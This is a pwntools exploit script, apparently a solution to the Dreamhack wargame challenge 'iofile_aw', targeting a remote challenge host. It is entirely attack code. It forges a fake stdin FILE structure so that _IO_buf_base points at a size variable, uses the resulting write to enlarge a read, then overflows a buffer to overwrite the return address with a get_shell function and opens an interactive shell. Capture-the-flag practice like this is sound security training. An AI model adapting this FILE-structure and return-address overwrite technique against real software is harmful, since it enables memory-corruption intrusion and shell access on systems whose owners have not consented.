from pwn import *

def slog(symbol, addr): return success(symbol + ": " + hex(addr))
context.log_level = 'debug'

p = remote("host1.dreamhack.games", 15251)
# p = process("./iofile_aw")
e = ELF("./iofile_aw")

# gdb.attach(p)

buf = e.symbols['buf']
size_addr = e.symbols['size']
get_shell = e.symbols["get_shell"]
slog("buf",buf)
slog("size",size_addr)
slog("get_shell",get_shell)

def printf(payload):
    pay = b"printf "
    pay += payload
    p.sendlineafter("# ", pay)

def read():
    p.sendlineafter("# ", "read")

buf2ret = 544+8

# [1] fake stdin : _IO_buf_base => size
payload = p64(0xfbad2488)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(size_addr)

printf(payload)
read()
p.sendline(str(0x600))

payload = b"exit"
payload += b"\x00"
payload += b"A"*(buf2ret-len(payload))
payload += p64(get_shell)

p.sendlineafter("# ", payload)

p.interactive()